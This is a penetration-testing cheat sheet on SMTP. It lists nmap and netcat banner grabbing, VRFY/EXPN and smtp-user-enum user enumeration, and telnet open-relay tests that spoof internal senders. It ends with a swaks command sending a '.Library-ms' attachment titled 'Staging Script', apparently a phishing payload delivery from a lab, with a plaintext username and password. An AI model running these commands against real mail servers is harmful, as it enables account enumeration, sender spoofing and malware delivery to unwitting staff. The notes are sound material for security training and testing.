## Enumeration 
### banner grabbing 
```bash
# nmap
nc -nv <IP> -p 25
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

### authentication 
```bash
telnet 10.10.110.20 25
VRFY root
VRFY www-data
EXPN john
EXPN support-team
USER julio
```

### nmap open relay check 
```bash
nmap <IP> -p25 --script smtp-open-relay -v
```

### smtp-enum-users
```bash
smtp-user-enum -M RCPT -U users.txt -D domain -t <IP>
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t <IP>
```

<br> 

## Attacking SMTP 
### Open Relay Attacks 
```bash
# sending email with Telnet (external address to external address) - https://www.blackhillsinfosec.com/how-to-test-for-open-mail-relays/
telnet <mail.server> 25
HELO optiv.com 
MAIL FROM: tester@optiv.com
RCPT TO: tester@optiv.com
DATA
This is a test email.

# sending email from internal address to external address
telnet <mail server IP> 25
HELO optiv.com
MAIL FROM: tester@optiv.com
RCPT TO: HR@targetdomain.com
DATA
This is a test email.

# sending email from internal address to internal address
telnet <mail server IP> 25
HELO targetdomain.com
MAIL FROM: helpdesk@targetdomain.com
RCPT TO: HR@targetdomain.com
DATA
This is a test email.
```

### sending email 
```bash
# Swaks
swaks --from <email_address> --to (email_address> --header 'Subject: Company Notification' --body 'This is a test.' --server <mail_server_IP

swaks -t jim@relia.com --from johnny@relia.com --attach @config.Library-ms --server 192.168.238.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: maildmz
Password: DPuBT9tGCBrTbR
=== Trying 192.168.238.189:25...
=== Connected to 192.168.238.189.
```
